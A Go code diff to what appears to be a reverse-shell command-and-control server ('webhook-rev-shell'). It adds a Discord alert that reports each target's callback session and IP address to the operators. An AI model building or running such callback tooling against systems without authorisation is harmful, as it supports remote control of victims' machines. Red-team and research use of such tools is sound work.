@@ -4,12 +4,15 @@ import (
 	"context"
 	"encoding/json"
 	"errors"
+	"log"
+	"net"
 	"net/http"
 	"time"
 
 	"github.com/go-chi/chi/v5"
 	"github.com/google/uuid"
 	"github.com/noahmagill/webhook-rev-shell/internal/broker"
+	"github.com/noahmagill/webhook-rev-shell/internal/notify"
 	"github.com/noahmagill/webhook-rev-shell/internal/operatorinput"
 	"github.com/noahmagill/webhook-rev-shell/internal/protocol"
 	"nhooyr.io/websocket"
@@ -17,6 +20,7 @@ import (
 
 type WSTargetHandler struct {
 	B              *broker.Broker
+	Discord        *notify.Discord
 	OriginPatterns []string
 }
 
@@ -120,6 +124,15 @@ func (h *WSTargetHandler) Connect(w http.ResponseWriter, r *http.Request) {
 	})
 	conn.Write(ctx, websocket.MessageText, ack)
 
+	if h.Discord != nil && h.Discord.Enabled() {
+		callbackIP := requestIPFromRemote(r.RemoteAddr)
+		go func() {
+			if err := h.Discord.CallbackConnected(sess, target, callbackIP); err != nil {
+				log.Printf("discord callback notify: %v", err)
+			}
+		}()
+	}
+
 	// Read from target -> broadcast to operators
 	go func() {
 		defer cancel()
@@ -154,4 +167,12 @@ func (h *WSTargetHandler) Connect(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 	}
+}
+
+func requestIPFromRemote(remoteAddr string) string {
+	host, _, err := net.SplitHostPort(remoteAddr)
+	if err == nil {
+		return host
+	}
+	return remoteAddr
 }
